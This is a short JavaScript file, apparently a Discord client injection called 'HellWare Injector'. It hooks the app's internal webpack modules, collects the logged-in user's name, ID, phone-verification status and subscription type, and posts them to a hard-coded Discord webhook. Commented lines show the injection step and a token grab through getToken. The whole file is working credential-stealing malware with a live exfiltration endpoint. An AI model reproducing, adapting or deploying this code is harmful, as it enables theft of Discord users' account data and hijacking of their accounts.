//inject here
//const { join } = require("path");
//process.env.ClientDirectory = join(__dirname, 'injection');
//require(`${proWcess.env.ClientDirectory}\\payload.js`);
//var token = FilterWebpackModule("getToken").getToken();

function FilterWebpackModule(item) {
    var req = window.webpackJsonp.push([[], { '__extra_id__': (module, exports, req) => module.exports = req }, [['__extra_id__']]]);

    for (const in1 in req.c) {
        if (req.c.hasOwnProperty(in1)) {
            const m = req.c[in1].exports;
            if (m && m.__esModule && m.default && m.default[item]) return m.default;
            if (m && m[item]) return m;
        }
    }
}

var webhook = 'https://ptb.discord.com/api/webhooks/840412525790232606/ScgY44_XJpu4BLFhjRYxiy1w7EAsU9cImf6k6-rhWvlcDXZwLPU7Qve5l44x9faNjfCX'

function Sender(webhook) {
    var request = new XMLHttpRequest();

    request.open("POST", webhook);
  
    request.setRequestHeader('Content-type', 'application/json');
    nitrosub = FilterWebpackModule("getCurrentUser").getCurrentUser().premiumType
    if (nitrosub < 1){
      var sub = 'Nitro'
    }
    else{
      var sub = null
    }

    var params = {
        username: "HellWare Injector",
        avatar_url: "https://i.pinimg.com/736x/40/47/b3/4047b3ab4f17d7c15a755cf6080eea76.jpg",
        "embeds": [
            {
              "title": "Status",
              "color": 0xf4a8ff,
              "fields": [
                {
                  "name": "User",
                  "value": FilterWebpackModule("getCurrentUser").getCurrentUser().username + "#" + FilterWebpackModule("getCurrentUser").getCurrentUser().discriminator,
                  "inline": false
                },
                {
                  "name": "User ID",
                  "value": FilterWebpackModule("getCurrentUser").getCurrentUser().id,
                  "inline": false
                },
                {
                  "name": "Token",
                  "value": "Hidden",
                  "inline": false
                },
                {
                  "name": "Verified Phone",
                  "value": FilterWebpackModule("getCurrentUser").getCurrentUser().mobile,
                  "inline": false
                },
                {
                    "name": "Nitro Sub",
                    "value": "True",
                    "inline": false
                  },
              ],
              "thumbnail": {
                "url": "https://maxcdn.icons8.com/Share/icon/Logos/discord_logo1600.png"
              }
            }
          ]
    }
  
    request.send(JSON.stringify(params));
}

Sender(webhook)